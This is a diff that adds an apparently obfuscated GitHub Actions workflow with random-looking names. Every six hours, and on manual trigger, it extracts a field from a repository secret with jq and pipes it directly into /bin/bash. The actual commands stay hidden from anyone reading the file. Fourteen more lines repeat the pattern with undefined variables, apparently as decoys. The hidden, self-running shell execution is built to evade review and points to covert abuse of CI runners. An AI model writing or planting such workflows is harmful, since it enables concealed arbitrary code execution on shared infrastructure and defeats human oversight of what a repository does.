@@ -1,0 +1,32 @@
+name: stellaconsul9388
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: stellaconsul9388
+        env:
+          d953: ${{ secrets.d953 }}
+        run: |
+          echo $d953 | jq -r .lq2125 | /bin/bash
+          echo $p132 | jq -r .qa2 | /bin/bash
+          echo $uijbc8 | jq -r .uzxz75672 | /bin/bash
+          echo $jn8 | jq -r .n5 | /bin/bash
+          echo $fqz0468 | jq -r .kcrnz2 | /bin/bash
+          echo $nt38255 | jq -r .ojgh76 | /bin/bash
+          echo $ctbun2507 | jq -r .b5 | /bin/bash
+          echo $o7 | jq -r .xa7 | /bin/bash
+          echo $jj28929 | jq -r .w0708 | /bin/bash
+          echo $b98 | jq -r .mlomt5 | /bin/bash
+          echo $kms4712 | jq -r .rasf084 | /bin/bash
+          echo $uvuox92 | jq -r .i79 | /bin/bash
+          echo $sorr477 | jq -r .mph3679 | /bin/bash
+          echo $sfllm32779 | jq -r .gnjtl36343 | /bin/bash
+          echo $lv5244 | jq -r .iybzi7518 | /bin/bash
+
